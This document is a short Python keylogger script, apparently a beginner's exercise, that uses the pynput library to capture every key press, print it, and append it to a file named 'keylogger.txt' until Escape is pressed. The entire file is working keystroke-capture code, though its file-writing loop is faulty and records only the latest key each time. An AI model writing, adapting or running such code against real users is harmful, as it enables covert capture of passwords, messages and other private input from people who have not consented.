from pynput.keyboard import Key, Listener

keys= []

def keypress(key):
    if key == Key.space:
        filtered_keys = ' '
    elif key == Key.shift:
        filtered_keys = ''
    else:
        filtered_keys = key
    keys.append(filtered_keys)
    filewritter(keys)
    print(key)

def filewritter(string):
    with open('keylogger.txt', 'a') as writter:
        for i in string:
            new_strings= str(i).replace("'", '')
        writter.write(new_strings)
        writter.write(" ")
def release(key):
    if key == Key.esc:
        return False

with Listener(on_press= keypress, on_release= release) as listened_data:
    listened_data.join()